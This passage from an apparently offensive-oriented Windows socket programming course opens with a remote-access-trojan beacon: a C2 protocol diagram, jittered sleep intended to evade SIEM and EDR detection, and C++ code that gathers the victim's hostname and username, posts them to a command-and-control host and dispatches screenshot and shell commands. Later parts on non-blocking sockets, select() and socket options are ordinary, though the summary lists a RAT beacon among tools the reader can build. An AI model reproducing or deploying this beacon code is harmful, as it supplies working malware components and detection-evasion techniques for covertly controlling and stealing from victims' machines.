1. Phone home (HTTP POST to C2)
2. Receive a command
3. Execute the command
4. Send the result back
5. Sleep
6. Repeat

### The beacon flow

```
Bot                              C2 Server
 │                                   │
 │── POST /beacon ──────────────────▶│
 │   Body: { "id": "abc123",         │
 │           "host": "DESKTOP-XYZ",  │
 │           "os": "Win 11 22H2",    │
 │           "user": "john" }        │
 │                                   │
 │◀── 200 OK ─────────────────────────│
 │    Body: { "cmd": "screenshot",   │
 │            "task_id": "t1" }      │
 │                                   │
 │   [execute screenshot]            │
 │                                   │
 │── POST /result ──────────────────▶│
 │   Body: { "id": "abc123",         │
 │           "task_id": "t1",        │
 │           "data": "<base64>" }    │
 │                                   │
 │◀── 200 OK ─────────────────────────│
 │    Body: { "cmd": "sleep" }       │
 │                                   │
 │   [sleep 5 seconds, then repeat]  │
```

### Jitter: why you cannot use a fixed interval

```cpp
// BAD: exactly 5 seconds every time
Sleep(5000);

// This creates a perfect periodic spike in network traffic.
// A SIEM (Security Information and Event Management) system
// doing basic statistics will flag it:
//   "This process made HTTP requests at exactly t=0, t=5, t=10, t=15..."
//   → Beacon detected.
```

```cpp
// GOOD: jitter — random variation around the base interval
#include <cstdlib>
#include <ctime>

void jitteredSleep(int baseMs, int jitterMs) {
    // jitterMs is the max deviation (±)
    // Result: anywhere from (baseMs - jitterMs) to (baseMs + jitterMs)
    int variation = (rand() % (jitterMs * 2 + 1)) - jitterMs;
    int sleepTime = baseMs + variation;
    if (sleepTime < 100) sleepTime = 100;  // minimum 100ms
    Sleep(sleepTime);
}

// Example: base 5 seconds, ±2 second jitter
// Sleep time varies: 3000ms to 7000ms
jitteredSleep(5000, 2000);
```

**Coefficient of Variation (CV):** Some EDRs measure the statistical regularity
of network connections. CV = standard deviation / mean. A perfect beacon has
CV = 0. With 40% jitter, CV ≈ 0.25 — much harder to detect.

### A minimal beacon loop

```cpp
void beaconLoop(const char* c2Host, int baseInterval) {
    srand((unsigned)time(nullptr));

    // Gather basic victim info once
    char hostname[256] = {};
    GetComputerNameA(hostname, nullptr);

    char username[256] = {};
    DWORD ulen = 256;
    GetUserNameA(username, &ulen);

    // Build the bot ID (in real code: hash of hardware identifiers)
    char botId[64] = {};
    sprintf_s(botId, "%s_%s", hostname, username);

    while (true) {
        // Build the JSON beacon body
        char body[1024] = {};
        sprintf_s(body,
            "{\"id\":\"%s\",\"host\":\"%s\",\"user\":\"%s\",\"os\":\"Windows\"}",
            botId, hostname, username);

        // Send beacon and receive command
        std::string response = httpsPost(c2Host, "/beacon",
                                         INTERNET_DEFAULT_HTTPS_PORT, body);

        if (!response.empty()) {
            // Parse command from response (simplified — use a JSON library in real code)
            if (response.find("\"screenshot\"") != std::string::npos) {
                // executeScreenshot();
            } else if (response.find("\"shell\"") != std::string::npos) {
                // executeShell();
            }
            // ... handle other commands
        }

        // Sleep with jitter
        jitteredSleep(baseInterval, baseInterval / 3);
    }
}
```

---

## Part 15 — Non-Blocking Sockets and select()

Everything you have read so far uses **blocking** sockets. When you call
`recv()`, your thread stops until data arrives. This is fine for simple
programs but has two problems:

1. You cannot handle multiple clients simultaneously in one thread
2. You cannot time out a connection attempt

**Non-blocking sockets** return immediately even if no data is ready.

```cpp
// Make a socket non-blocking:
u_long mode = 1;  // 1 = non-blocking, 0 = blocking (default)
ioctlsocket(sock, FIONBIO, &mode);

// Now recv() returns immediately:
char buf[1024];
int r = recv(sock, buf, sizeof(buf), 0);
if (r == SOCKET_ERROR) {
    int err = WSAGetLastError();
    if (err == WSAEWOULDBLOCK) {
        // No data available yet — this is NOT a real error
        // in non-blocking mode. Try again later.
    } else {
        // Real error
    }
}
```

### `select()` — wait for activity on multiple sockets

`select()` lets you monitor many sockets at once and tells you which ones are
ready to read/write, without blocking on any single one.

```cpp
// Wait up to 5 seconds for data on any of these sockets:
fd_set readSet;
FD_ZERO(&readSet);           // clear the set
FD_SET(sock1, &readSet);     // add sock1
FD_SET(sock2, &readSet);     // add sock2

struct timeval timeout = {};
timeout.tv_sec  = 5;   // 5 seconds
timeout.tv_usec = 0;

// select() blocks until data arrives on any socket, or timeout
int ready = select(0, &readSet, nullptr, nullptr, &timeout);
//          ^       ^read       ^write   ^error   ^timeout
//          0 = ignored on Windows (socket count, meaningful on Linux)

if (ready == 0) {
    printf("Timeout — no data in 5 seconds\n");
} else if (ready == SOCKET_ERROR) {
    printf("select() error: %d\n", WSAGetLastError());
} else {
    // Check which socket has data
    if (FD_ISSET(sock1, &readSet)) {
        // sock1 has data ready to recv()
    }
    if (FD_ISSET(sock2, &readSet)) {
        // sock2 has data ready to recv()
    }
}
```

**`select()` use case in security tools:** a port scanner uses `select()` to
try hundreds of ports simultaneously, waiting for connect to succeed or timeout,
without spawning a thread per port.

---

## Part 16 — Socket Options Worth Knowing

```cpp
// SO_RCVTIMEO / SO_SNDTIMEO: set timeout on recv/send
// After this, recv() will return WSAETIMEDOUT if no data in 10 seconds
DWORD timeout = 10000;  // milliseconds
setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO,
           (const char*)&timeout, sizeof(timeout));
setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO,
           (const char*)&timeout, sizeof(timeout));

// SO_KEEPALIVE: OS sends probe packets if connection is idle
// Detects dead connections without application-level heartbeats
int keepAlive = 1;
setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE,
           (const char*)&keepAlive, sizeof(keepAlive));

// TCP_NODELAY: disable Nagle algorithm
// Nagle buffers small sends to batch them. For interactive protocols
// (like a shell over a RAT), you want each keystroke sent immediately.
int noDelay = 1;
setsockopt(sock, IPPROTO_TCP, TCP_NODELAY,
           (const char*)&noDelay, sizeof(noDelay));

// SO_REUSEADDR: allow binding to a port in TIME_WAIT state
// Always set this on server sockets before bind()
int reuse = 1;
setsockopt(sock, SOL_SOCKET, SO_REUSEADDR,
           (const char*)&reuse, sizeof(reuse));
```

---

## Part 17 — Summary: What You Can Now Build

After reading this module, you can independently build:

| Tool | Concepts used |
|------|--------------|
| Port scanner | socket + connect + select + timeout |
| TCP chat app | server + accept loop + send/recv |
| File transfer tool | sendAll/recvAll + length-prefix protocol |
| HTTP client | WinINet GET/POST |
| RAT beacon | WinINet POST + JSON + jitter loop |
| Echo server | server + accept + recv/send loop |
| DNS resolver | getaddrinfo |
| Network inventory tool | connect probing many IPs |

---

## Part 18 — The Complete Picture: One Diagram

```
Your program calls send("HELLO", 5)
         │
         ▼
  Winsock (ws2_32.dll)
  adds TCP header: src=192.168.1.5:51234  dst=192.168.1.100:4444
         │
         ▼
  OS kernel (TCP/IP stack)
  adds IP header: src=192.168.1.5  dst=192.168.1.100
  fragments if needed, handles retransmission
         │
         ▼
  Network adapter driver
  adds Ethernet frame: src MAC → dst MAC
         │
         ▼
  Physical wire / WiFi
         │
         ▼
  [travels through switches, routers]
         │
         ▼
  Destination machine's network adapter
  strips Ethernet frame
         │
         ▼
  OS kernel
  strips IP header, TCP header
  puts data in socket's receive buffer
         │
         ▼
  Destination program calls recv(sock, buf, 1024, 0)
  OS copies "HELLO" from receive buffer into buf
  recv() returns 5
```

You only see the top and bottom of this stack. Everything in between is the OS.

---

## Key Rules to Never Forget

1. **Always call `WSAStartup` before any socket function**
2. **Always call `WSACleanup` when done**
3. **Always `htons()` ports before putting them in `sockaddr_in`**
4. **Always loop on `send()` and `recv()` — never assume you got everything in one call**
5. **Always check return values — silent failures cause mysterious bugs**
6. **Always `closesocket()` every socket you `socket()`**
7. **Client: `socket → connect → send/recv`**
8. **Server: `socket → bind → listen → accept → send/recv`**
9. **`accept()` returns a NEW socket — use that for the client, keep the listening socket open**
10. **Strings do not need byte order conversion. Integers (ports, lengths) do.**
